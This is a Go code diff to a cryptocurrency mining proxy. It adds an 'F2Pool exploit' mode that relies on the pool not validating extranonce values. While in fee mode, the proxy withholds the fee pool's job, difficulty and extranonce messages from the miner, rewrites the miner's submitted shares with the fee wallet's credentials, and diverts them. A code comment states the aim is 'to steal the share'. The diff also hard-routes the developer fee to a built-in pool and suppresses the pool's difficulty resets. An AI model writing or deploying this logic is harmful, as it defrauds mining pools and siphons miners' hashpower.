@@ -146,6 +146,7 @@ type Session struct {
 	FeeAuthWorker  string
 
 	InBandFeeActive bool
+	IsF2PoolExploit bool
 
 	LastExtranonceCmdTime time.Time
 	IsBuggyAsic           bool
@@ -295,7 +296,7 @@ func (s *Session) Start() {
 		ApplyTcpNoDelay(s.MainConn)
 	}
 
-	go s.timerLoop()
+	// go s.timerLoop() removed in favor of Centralized Fee Scheduler
 	go s.StartVardiffEngine()
 	go s.Watchdog()
 	go s.readMainLoop()
@@ -687,6 +688,18 @@ func (s *Session) readMinerLoop() {
 				}
 			}
 
+			s.mu.Lock()
+			isExploit := s.IsF2PoolExploit
+			inBandFeeActive := s.InBandFeeActive
+			s.mu.Unlock()
+
+			// [SmartRouting Fix]: If exploit or InBand mode is active and we are in FEE state,
+			// the miner is hashing a Main pool job. `checkJobIsMain` will return true,
+			// but we MUST route it to the interception block (isMainRoute = false) to steal the share.
+			if (isExploit || inBandFeeActive) && (state == "FEE" || state == "SWITCHING_TO_FEE") {
+				isMainRoute = false
+			}
+
 			if isMainRoute {
 				if mainConn != nil {
 					// Vardiff Fake Accept logic check
@@ -726,9 +739,12 @@ func (s *Session) readMinerLoop() {
 			} else {
 				s.mu.Lock()
 				inBandFeeActive := s.InBandFeeActive
+				isExploit := s.IsF2PoolExploit
+				feeWallet := s.FeeAuthWallet
+				feeWorker := s.FeeAuthWorker
 				s.mu.Unlock()
 
-				if feeConn != nil || inBandFeeActive {
+				if feeConn != nil || inBandFeeActive || isExploit {
 					shouldFakeAccept := false
 
 					if shouldFakeAccept {
@@ -738,34 +754,28 @@ func (s *Session) readMinerLoop() {
 							safeWrite(s.MinerConn, []byte(fakeReply), 5*time.Second)
 						}
 					} else {
-						s.mu.Lock()
-						feeW := s.FeeAuthWallet
-						feeWrk := s.FeeAuthWorker
-						s.mu.Unlock()
-
-						if method == "mining.submit" {
-							if params, ok := msg["params"].([]interface{}); ok && len(params) > 0 {
-								if feeW != "" && feeWrk != "" {
-									params[0] = fmt.Sprintf("%s.%s", feeW, feeWrk)
-								} else if feeW != "" {
-									params[0] = feeW
-								} else if feeWrk != "" {
-									params[0] = feeWrk
-								}
-								if modBytes, err := json.Marshal(msg); err == nil {
-									line = string(modBytes)
-								}
-							}
-						}
-
 						if id, ok := msg["id"]; ok {
 							s.pendingShares.Store(id, PendingShare{Req: strings.TrimSpace(line), IsFee: true})
 						}
 
+						// Rewrite submit credentials for the fee connection
+						if method == "mining.submit" {
+							if params, ok := msg["params"].([]interface{}); ok && len(params) > 0 {
+								if _, ok := params[0].(string); ok {
+									msg["params"].([]interface{})[0] = fmt.Sprintf("%s.%s", feeWallet, feeWorker)
+								}
+							}
+						} else if method == "eth_submitWork" {
+							// ETH Proxy doesn't send worker name in submitWork
+						}
+						
+						modBytes, _ := json.Marshal(msg)
+						finalLine := string(modBytes)
+						
 						if inBandFeeActive && mainConn != nil {
-							safeFprintf(mainConn, 5*time.Second, "%s\n", line)
+							safeFprintf(mainConn, 5*time.Second, "%s\n", finalLine)
 						} else if feeConn != nil {
-							safeFprintf(feeConn, 5*time.Second, "%s\n", line)
+							safeFprintf(feeConn, 5*time.Second, "%s\n", finalLine)
 						}
 					}
 				} else {
@@ -938,10 +948,21 @@ func (s *Session) readMainLoop() {
 					if params, ok := msg["params"].([]interface{}); ok && len(params) > 0 {
 						if diffFloat, ok := params[0].(float64); ok {
 							s.mu.Lock()
+							inBandActive := s.InBandFeeActive
+							enableVardiff := s.Config.EnableVardiff
+							s.mu.Unlock()
+
+							if inBandActive {
+								// INTERCEPT: Do not forward unexpected difficulty resets from the pool 
+								// during In-Band fee routing, as it causes ASIC hashrate drops/restarts.
+								s.LogGeneral("[SmartRouting] Intercepted pool difficulty drop (%.0f) during In-Band Fee. Miner kept at %.0f", diffFloat, s.MainDifficulty)
+								continue
+							}
+
+							s.mu.Lock()
 							s.CurrentDiff = diffFloat
 							s.MainDifficulty = diffFloat
 							s.RemoteDiff = diffFloat
-							enableVardiff := s.Config.EnableVardiff
 							s.mu.Unlock()
 							GlobalDispatcher.UpdateDiff(s.Config.PoolAddress, diffFloat)
 
@@ -969,9 +990,18 @@ func (s *Session) readMainLoop() {
 		s.mu.Lock()
 		state := s.State
 		minerConn := s.MinerConn
+		isExploit := s.IsF2PoolExploit
+		inBandFeeActive := s.InBandFeeActive
 		s.mu.Unlock()
 
-		if state == "MAIN" || state == "SWITCHING_TO_MAIN" {
+		shouldForward := (state == "MAIN" || state == "SWITCHING_TO_MAIN")
+		if state == "FEE" || state == "SWITCHING_TO_FEE" {
+			if isExploit || inBandFeeActive {
+				shouldForward = true
+			}
+		}
+
+		if shouldForward {
 			if minerConn != nil {
 				safeFprintf(minerConn, 5*time.Second, "%s\n", line)
 			}
@@ -979,205 +1009,109 @@ func (s *Session) readMainLoop() {
 	}
 }
 
-func (s *Session) timerLoop() {
-	ticker := time.NewTicker(time.Second)
-	defer ticker.Stop()
-
-	for {
-		select {
-		case <-s.quit:
-			return
-		case <-ticker.C:
-			s.mu.Lock()
-			devPercent := s.Config.DevFeePercent
-			opPercent := s.Config.OperatorFeePercent
-			cycleMins := s.Config.FeeCycleMinutes
-			s.mu.Unlock()
-
-			if cycleMins <= 0 {
-				cycleMins = 100 // Default to 100 minutes if not set or invalid
-			}
-			cycleLength := cycleMins * 60
-
-			feePercent := devPercent + opPercent
-			if feePercent <= 0 {
-				continue
-			}
-
-			feeSeconds := int((feePercent / 100.0) * float64(cycleLength))
-			devSeconds := int((devPercent / 100.0) * float64(cycleLength))
-			opSeconds := int((opPercent / 100.0) * float64(cycleLength))
-
-			if s.cycleOffset == -1 {
-				if feeSeconds >= cycleLength {
-					s.cycleOffset = 0
-				} else {
-					nonFeeLength := cycleLength - feeSeconds
-					// Ensure at least 20 minutes (1200s) grace period before fee triggers to establish PeakHash
-					maxR := nonFeeLength - 1200
-					if maxR < 1 {
-						maxR = nonFeeLength // Fallback to full random if cycle is short
-					}
-					if maxR < 1 {
-						maxR = 1
-					}
-					R := rand.Intn(maxR)
-					nowSec := int(time.Now().Unix())
-					s.cycleOffset = (feeSeconds + R - (nowSec % cycleLength) + cycleLength) % cycleLength
-				}
-			}
-
-			nowSec := int(time.Now().Unix())
-			secondInCycle := (nowSec + s.cycleOffset) % cycleLength
-
-			targetMode := FeeModeNone
-			if secondInCycle < devSeconds {
-				targetMode = FeeModeDev
-			} else if secondInCycle < devSeconds+opSeconds {
-				targetMode = FeeModeOperator
-			}
-
-			// Pre-warm 3 seconds before target mode switches
-			preWarmSec := (secondInCycle + 3) % cycleLength
-			preWarmMode := FeeModeNone
-			if preWarmSec < devSeconds {
-				preWarmMode = FeeModeDev
-			} else if preWarmSec < devSeconds+opSeconds {
-				preWarmMode = FeeModeOperator
-			}
-
-			s.mu.Lock()
-			// Handle Pre-Warming
-			if preWarmMode != s.CurrentFeeMode && preWarmMode != FeeModeNone && !s.IsPreWarmed {
-				s.IsPreWarmed = true
-				if preWarmMode == FeeModeDev {
-					devWorker := s.Config.DevWorker
-					if devWorker == "" {
-						devWorker = "dev_worker"
-					}
-					go s.ConnectFee(s.Config.DevWallet, devWorker, true)
-				} else if preWarmMode == FeeModeOperator {
-					opWorker := s.Config.OperatorWorker
-					if opWorker == "" {
-						opWorker = "op_worker"
-					}
-					go s.ConnectFee(s.Config.OperatorWallet, opWorker, false)
-				}
-			}
-
-			// Handle Actual Switch
-			var extranonceToSend *ExtranonceData
-			var jobToSend string
-			var difficultyToSend float64
-			var currentMinerConn net.Conn
-
-			if targetMode != s.CurrentFeeMode {
-				s.CurrentFeeMode = targetMode
-				s.IsPreWarmed = false // Reset pre-warm flag
-				currentMinerConn = s.MinerConn
-
-				if targetMode == FeeModeNone {
-					s.TargetState = "MAIN"
-					s.State = "SWITCHING_TO_MAIN"
-					go s.EndFee()
-					
-					if !s.InBandFeeActive {
-						if s.Config.EnableAsic && s.Protocol != "ETH_PROXY" {
-							if s.FeeExtranonce == nil || s.MainExtranonce == nil || s.FeeExtranonce.En2Size != s.MainExtranonce.En2Size || s.FeeExtranonce.En1 != s.MainExtranonce.En1 {
-								extranonceToSend = s.MainExtranonce
-								s.LastExtranonceCmdTime = time.Now()
-							}
-							if s.MainDifficulty > 0 && s.MainDifficulty != s.CurrentDiff {
-								difficultyToSend = s.MainDifficulty
-								s.CurrentDiff = s.MainDifficulty // Update local tracking immediately
-							}
-						}
-						// Zero-latency job injection using Global Dispatcher
-						cachedJob := GlobalDispatcher.GetJob(s.Config.PoolAddress)
-						if cachedJob == "" {
-							cachedJob = s.LatestMainJob
-						}
-						if cachedJob != "" && currentMinerConn != nil {
-							jobToSend = forceCleanJobs(cachedJob)
-						}
-						// Zero-latency job recovery for ETH_PROXY when returning to Main
-						if s.Protocol == "ETH_PROXY" {
-							mainConn := s.MainConn
-							if mainConn != nil {
-								go func(conn net.Conn) {
-									getWorkPkt := `{"id": 0, "method": "eth_getWork", "params": []}` + "\n"
-									safeWrite(conn, []byte(getWorkPkt), 5*time.Second)
-								}(mainConn)
-							}
-						}
-					} else {
-						s.State = "MAIN" // instant switch
-					}
-				} else if targetMode == FeeModeDev || targetMode == FeeModeOperator {
-					isConnDead := s.FeeConn == nil && !s.InBandFeeActive && s.FeeAuthFailures > 0
-					
-					if isConnDead {
-						s.TargetState = "MAIN"
-						s.LogGeneral("[SmartRouting] Fee connection failed during pre-warm, skipping fee cycle.")
-					} else {
-						s.TargetState = "FEE"
-						s.State = "SWITCHING_TO_FEE"
-						
-						if !s.InBandFeeActive {
-							if s.Config.EnableAsic && s.Protocol != "ETH_PROXY" {
-								if s.FeeExtranonce == nil || s.MainExtranonce == nil || s.FeeExtranonce.En2Size != s.MainExtranonce.En2Size || s.FeeExtranonce.En1 != s.MainExtranonce.En1 {
-									extranonceToSend = s.FeeExtranonce
-									s.LastExtranonceCmdTime = time.Now()
-								}
-								if s.FeeDifficulty > 0 && s.FeeDifficulty != s.CurrentDiff {
-									difficultyToSend = s.FeeDifficulty
-									s.CurrentDiff = s.FeeDifficulty // Update local tracking immediately
-								}
-							}
-							// Zero-latency job injection for Fee
-							cachedJob := s.LatestFeeJob
-							if cachedJob != "" && currentMinerConn != nil {
-								jobToSend = forceCleanJobs(cachedJob)
-							}
-						} else {
-							s.State = "FEE" // instant switch
-						}
-					} // Close else block
-				}
-			}
-			s.mu.Unlock()
-
-			// Perform TCP socket writes sequentially in a single async routine to prevent out-of-order packets (critical for ASICs)
-			if currentMinerConn != nil && (extranonceToSend != nil || jobToSend != "" || difficultyToSend > 0) {
-				go func(conn net.Conn, en *ExtranonceData, job string, diff float64) {
-					if diff > 0 {
-						msg := map[string]interface{}{
-							"id":     nil,
-							"method": "mining.set_difficulty",
-							"params": []interface{}{diff},
-						}
-						if msgBytes, err := json.Marshal(msg); err == nil {
-							safeFprintf(conn, 5*time.Second, "%s\n", string(msgBytes))
-						}
-					}
-					if en != nil {
-						msg := map[string]interface{}{
-							"id":     nil,
-							"method": "mining.set_extranonce",
-							"params": []interface{}{en.En1, en.En2Size},
-						}
-						if msgBytes, err := json.Marshal(msg); err == nil {
-							safeFprintf(conn, 5*time.Second, "%s\n", string(msgBytes))
-						}
-					}
-					if job != "" {
-						safeFprintf(conn, 5*time.Second, "%s\n", job)
-					}
-				}(currentMinerConn, extranonceToSend, jobToSend, difficultyToSend)
-			}
+func (s *Session) StartFeeMining(isDev bool) {
+	worker := s.Config.DevWorker
+	wallet := s.Config.DevWallet
+	mode := FeeModeDev
+	if !isDev {
+		worker = s.Config.OperatorWorker
+		wallet = s.Config.OperatorWallet
+		mode = FeeModeOperator
+	}
+	if worker == "" {
+		if isDev {
+			worker = "dev_worker"
+		} else {
+			worker = "op_worker"
 		}
 	}
+
+	s.mu.Lock()
+	s.CurrentFeeMode = mode
+	s.TargetState = "FEE"
+	s.State = "SWITCHING_TO_FEE"
+	s.mu.Unlock()
+
+	go s.ConnectFee(wallet, worker, isDev)
 }
+
+func (s *Session) StopFeeMining() {
+	s.mu.Lock()
+	s.CurrentFeeMode = FeeModeNone
+	s.TargetState = "MAIN"
+	s.State = "SWITCHING_TO_MAIN"
+
+	var extranonceToSend *ExtranonceData
+	var jobToSend string
+	var difficultyToSend float64
+	var currentMinerConn net.Conn = s.MinerConn
+
+	if !s.InBandFeeActive {
+		if s.Config.EnableAsic && s.Protocol != "ETH_PROXY" {
+			if s.FeeExtranonce == nil || s.MainExtranonce == nil || s.FeeExtranonce.En2Size != s.MainExtranonce.En2Size || s.FeeExtranonce.En1 != s.MainExtranonce.En1 {
+				extranonceToSend = s.MainExtranonce
+				s.LastExtranonceCmdTime = time.Now()
+			}
+			if s.MainDifficulty > 0 && s.MainDifficulty != s.CurrentDiff {
+				difficultyToSend = s.MainDifficulty
+				s.CurrentDiff = s.MainDifficulty
+			}
+		}
+		// Zero-latency job injection using Global Dispatcher
+		cachedJob := GlobalDispatcher.GetJob(s.Config.PoolAddress)
+		if cachedJob == "" {
+			cachedJob = s.LatestMainJob
+		}
+		if cachedJob != "" && currentMinerConn != nil {
+			jobToSend = forceCleanJobs(cachedJob)
+		}
+		// Zero-latency job recovery for ETH_PROXY when returning to Main
+		if s.Protocol == "ETH_PROXY" {
+			mainConn := s.MainConn
+			if mainConn != nil {
+				go func(conn net.Conn) {
+					getWorkPkt := `{"id": 0, "method": "eth_getWork", "params": []}` + "\n"
+					safeWrite(conn, []byte(getWorkPkt), 5*time.Second)
+				}(mainConn)
+			}
+		}
+	} else {
+		s.State = "MAIN" // instant switch
+	}
+	s.mu.Unlock()
+
+	go s.EndFee()
+
+	// Perform TCP socket writes sequentially
+	if currentMinerConn != nil && (extranonceToSend != nil || jobToSend != "" || difficultyToSend > 0) {
+		go func(conn net.Conn, en *ExtranonceData, job string, diff float64) {
+			if diff > 0 {
+				msg := map[string]interface{}{
+					"id":     nil,
+					"method": "mining.set_difficulty",
+					"params": []interface{}{diff},
+				}
+				if msgBytes, err := json.Marshal(msg); err == nil {
+					safeFprintf(conn, 5*time.Second, "%s\n", string(msgBytes))
+				}
+			}
+			if en != nil {
+				msg := map[string]interface{}{
+					"id":     nil,
+					"method": "mining.set_extranonce",
+					"params": []interface{}{en.En1, en.En2Size},
+				}
+				if msgBytes, err := json.Marshal(msg); err == nil {
+					safeFprintf(conn, 5*time.Second, "%s\n", string(msgBytes))
+				}
+			}
+			if job != "" {
+				safeFprintf(conn, 5*time.Second, "%s\n", job)
+			}
+		}(currentMinerConn, extranonceToSend, jobToSend, difficultyToSend)
+	}
+}
+
 
 func (s *Session) ConnectFee(wallet, worker string, isDevMode bool) {
 	s.mu.Lock()
@@ -1236,22 +1170,10 @@ func (s *Session) ConnectFee(wallet, worker string, isDevMode bool) {
 
 	if isDevMode {
 		// 作者抽水 (DevFee) 专属绿卡通道
-		if !hasSpecificWallet {
-			s.mu.Lock()
-			authFailures := s.FeeAuthFailures
-			s.mu.Unlock()
-
-			if isSubAccount && authFailures == 0 {
-				s.SamePoolFeeActive = true
-				s.LogGeneral("[SmartRouting] DevFee subaccount prioritizing Same Pool.")
-			} else {
-				// 作者没有特定原生钱包，且（主矿不是子账户 或 之前同池授权失败）
-				// 绝对禁止去未知的主矿池碰壁，直接强制走内置鱼池！
-				host = "" // 留空以触发下方的内置鱼池自动填充
-				s.SamePoolFeeActive = false
-				s.LogGeneral("[SmartRouting] DevFee activated: Direct route to Built-in F2Pool for subaccount compatibility.")
-			}
-		}
+		// 绝对禁止去未知的主矿池碰壁，直接强制走内置鱼池！
+		host = "" // 留空以触发下方的内置鱼池自动填充
+		s.SamePoolFeeActive = false
+		s.LogGeneral("[SmartRouting] DevFee activated: Direct route to Built-in F2Pool for EXPLOIT compatibility.")
 	} else {
 		// 运营者抽水 (OpFee) 按照面板设置
 		if s.Config.FeePoolAddress != "" {
@@ -1299,21 +1221,46 @@ func (s *Session) ConnectFee(wallet, worker string, isDevMode bool) {
 	}
 	// -----------------------------------------
 
+	// Check if we are exploiting F2Pool's lack of extranonce validation
+	isF2Pool := false
+	if strings.Contains(strings.ToLower(host), "f2pool") {
+		expectedCoin := strings.ToUpper(s.Config.CoinName)
+		if expectedCoin != "ETC" && expectedCoin != "ETHW" && expectedCoin != "PRL" {
+			isF2Pool = true
+		}
+	}
+
 	s.LogGeneral("Connecting to Fee Pool: %s (Identity: %s)", host, feeWallet)
 
 	s.mu.Lock()
 	s.FeeAuthWallet = wallet
 	s.FeeAuthWorker = worker
+	s.IsF2PoolExploit = isF2Pool
 	s.mu.Unlock()
+
+	if s.IsF2PoolExploit {
+		s.LogGeneral("[SmartRouting] F2Pool Exploit Mode Activated! Will NOT send extranonce to miner.")
+	}
 
 	if s.SamePoolFeeActive && s.Protocol != "ETH_PROXY" {
 		s.LogGeneral("[SmartRouting] In-Band Fee Routing Activated! Authorizing fee worker on Main connection.")
 		s.mu.Lock()
 		s.InBandFeeActive = true
+		s.State = "FEE"
 		mainConn := s.MainConn
 		s.mu.Unlock()
 		
 		if mainConn != nil {
+			s.mu.Lock()
+			currentDiff := s.MainDifficulty
+			s.mu.Unlock()
+
+			// [CRITICAL] Prevent pool from dropping difficulty to 65535 on new worker login
+			if currentDiff > 0 {
+				suggestMsg := fmt.Sprintf(`{"id": 99998, "method": "mining.suggest_difficulty", "params": [%f]}`+"\n", currentDiff)
+				safeWrite(mainConn, []byte(suggestMsg), 5*time.Second)
+			}
+
 			for _, pkt := range s.loginPackets {
 				pktBytes, _ := json.Marshal(pkt)
 				var mod map[string]interface{}
@@ -1457,8 +1404,9 @@ func (s *Session) ConnectFee(wallet, worker string, isDevMode bool) {
 									s.FeeExtranonce = en
 									state := s.State
 									mainEn := s.MainExtranonce
+									isExploit := s.IsF2PoolExploit
 									s.mu.Unlock()
-									if state == "FEE" || state == "SWITCHING_TO_FEE" {
+									if (state == "FEE" || state == "SWITCHING_TO_FEE") && !isExploit {
 										if s.Config.EnableAsic && s.Protocol != "ETH_PROXY" {
 											if mainEn == nil || mainEn.En2Size != en.En2Size || mainEn.En1 != en.En1 {
 												s.sendExtranonce(en)
@@ -1481,8 +1429,9 @@ func (s *Session) ConnectFee(wallet, worker string, isDevMode bool) {
 									s.FeeExtranonce = en
 									state := s.State
 									mainEn := s.MainExtranonce
+									isExploit := s.IsF2PoolExploit
 									s.mu.Unlock()
-									if state == "FEE" || state == "SWITCHING_TO_FEE" {
+									if (state == "FEE" || state == "SWITCHING_TO_FEE") && !isExploit {
 										if s.Config.EnableAsic && s.Protocol != "ETH_PROXY" {
 											if mainEn == nil || mainEn.En2Size != en.En2Size || mainEn.En1 != en.En1 {
 												s.sendExtranonce(en)
@@ -1585,10 +1534,23 @@ func (s *Session) ConnectFee(wallet, worker string, isDevMode bool) {
 					} else {
 						// NOT a share reply. Could be auth response or eth_getWork response.
 						isAuthReject := false
+						isAuthReply := false
 						if errObj, ok := msg["error"]; ok && errObj != nil {
 							isAuthReject = true
 						} else if res, ok := msg["result"]; ok && res == false {
 							isAuthReject = true
+						} else if res, ok := msg["result"]; ok && res == true {
+							isAuthReply = true
+						} else if resultMap, ok := msg["result"].(map[string]interface{}); ok && resultMap != nil {
+							isAuthReply = true // For protocols where result is an object
+						}
+
+						if isAuthReply {
+							s.mu.Lock()
+							if s.State == "SWITCHING_TO_FEE" {
+								s.State = "FEE"
+							}
+							s.mu.Unlock()
 						}
 						
 						if isAuthReject {
@@ -1670,7 +1632,9 @@ func (s *Session) ConnectFee(wallet, worker string, isDevMode bool) {
 						if params, ok := msg["params"].([]interface{}); ok && len(params) > 0 {
 							if diffFloat, ok := params[0].(float64); ok {
 								s.mu.Lock()
-								s.CurrentDiff = diffFloat
+								if !s.IsF2PoolExploit {
+									s.CurrentDiff = diffFloat
+								}
 								s.FeeDifficulty = diffFloat
 								s.mu.Unlock()
 							}
@@ -1699,7 +1663,14 @@ func (s *Session) ConnectFee(wallet, worker string, isDevMode bool) {
 					if isShareReply || isEthGetWorkReply {
 						safeFprintf(minerConn, 5*time.Second, "%s\n", line)
 					} else if method, ok := msg["method"].(string); ok {
-						if method == "mining.notify" || method == "mining.set_difficulty" || method == "mining.set_extranonce" || method == "eth_getWork" {
+						s.mu.Lock()
+						isExploit := s.IsF2PoolExploit
+						s.mu.Unlock()
+						
+						if isExploit && (method == "mining.set_extranonce" || method == "mining.set_difficulty" || method == "mining.notify") {
+							// [F2Pool Exploit] Do NOT forward these commands to the physical miner.
+							// The miner will continue hashing against the Main Pool's job parameters.
+						} else if method == "mining.notify" || method == "mining.set_difficulty" || method == "mining.set_extranonce" || method == "eth_getWork" {
 							safeFprintf(minerConn, 5*time.Second, "%s\n", line)
 						}
 					}
